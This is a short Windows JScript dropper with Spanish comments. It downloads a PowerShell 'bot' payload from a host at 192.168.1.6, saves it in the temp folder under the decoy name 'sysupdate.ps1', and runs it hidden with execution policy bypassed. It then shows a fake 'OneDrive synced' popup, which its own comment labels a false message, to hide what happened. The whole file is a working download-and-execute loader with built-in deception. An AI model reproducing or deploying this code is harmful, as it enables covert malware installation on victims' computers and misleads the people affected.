var WshShell = new ActiveXObject("WScript.Shell");
var url = "http://192.168.1.6:8000/static/payloads/bot_clear.ps1";
var psPath = WshShell.ExpandEnvironmentStrings("%TEMP%") + "\sysupdate.ps1";

// Descargar bot.ps1
var xhr = new ActiveXObject("MSXML2.XMLHTTP");
xhr.open("GET", url, false);
xhr.send();
if (xhr.status == 200) {
    var fso = new ActiveXObject("Scripting.FileSystemObject");
    var file = fso.CreateTextFile(psPath, true);
    file.Write(xhr.responseText);
    file.Close();
    
    // Ejecutar PowerShell oculto
    WshShell.Run('powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -File "' + psPath + '"', 0, false);
    
    // Mensaje falso
    WshShell.Popup("OneDrive se ha sincronizado correctamente.", 3, "OneDrive Sync", 64);
}
